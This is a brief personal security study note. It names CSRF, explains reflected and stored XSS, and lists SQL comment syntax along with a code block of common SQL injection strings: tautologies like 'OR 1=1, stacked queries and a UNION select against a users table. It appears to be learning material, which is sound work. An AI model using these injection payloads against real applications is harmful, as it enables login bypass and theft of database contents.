---
tag: "security"
date: "May 30, 2024"
title: "CSRF and XSS"
link: "note/csrf_xss"
description: ""
---

#### CSRF

Cross Site Request Forgery

#### XSS

- Reflected XSS
  - Request contains XSS input directly reflected back to victim's browser
- Stored XSS
  - XSS input sent to target website storing it as content
  - Later the content is accessed by victim's browser 

#### SQL Elements

- -- and # usually work in most database types
- /* work in some db like mysql

```sql
'OR 1=1
" OR 1=1
'OR'a'='a
') OR ('a'='a
' OR'1'='1
" OR "1"="1
select * from inventory where sku="" where 1=1;--
'; select * from users where 1=1;--';
='' UNION select * from users where 1=1;--';
```
